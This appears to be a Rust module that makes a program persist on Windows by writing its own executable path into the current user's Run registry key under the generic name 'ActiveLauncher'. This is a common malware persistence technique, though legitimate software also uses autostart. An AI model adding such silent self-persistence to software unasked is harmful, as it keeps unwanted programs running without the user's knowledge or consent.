use std::env::consts::OS;
use std::env::current_exe;
use std::error::Error;
use std::process::Command;
use std::thread;
use std::time::Duration;
use winreg::enums::*;
use winreg::RegKey;

pub fn persistent(current_path: String) {
    
    if OS == "windows"  {
    add_registry_win(current_path);
 }
}



fn add_registry_win(current_path: String) -> Result<(), Box<dyn Error>>{

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run = hkcu.open_subkey_with_flags("Software\\Microsoft\\Windows\\CurrentVersion\\Run", KEY_WRITE)?;
    run.set_value("ActiveLauncher", &current_path.as_str());
    Ok(())
}